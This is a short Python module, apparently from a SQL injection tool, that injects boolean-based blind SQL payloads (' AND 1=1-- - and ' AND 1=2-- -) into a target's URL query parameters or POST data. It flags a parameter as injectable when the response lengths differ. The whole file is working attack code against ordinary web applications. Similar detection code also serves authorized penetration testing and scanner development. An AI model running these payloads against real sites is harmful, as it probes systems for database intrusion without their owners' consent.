# modules/autodetect.py
def test(injector):
    print("[*] Testing for SQL injection...")
    true_payload = "' AND 1=1-- -"
    false_payload = "' AND 1=2-- -"

    true_response = inject(injector, true_payload)
    false_response = inject(injector, false_payload)

    if len(true_response) != len(false_response):
        print("[+] SQL injection point detected.")
    else:
        print("[-] No SQL injection point found.")

def inject(injector, payload):
    if "?" in injector.url:
        url = injector.url.replace("=", "=" + payload)
        r = injector.session.get(url, headers=injector.headers)
        return r.text
    elif injector.args.method.upper() == "POST":
        post_data = injector.args.data.replace("=", "=" + payload)
        r = injector.session.post(injector.url, data=post_data, headers=injector.headers)
        return r.text
    return ""
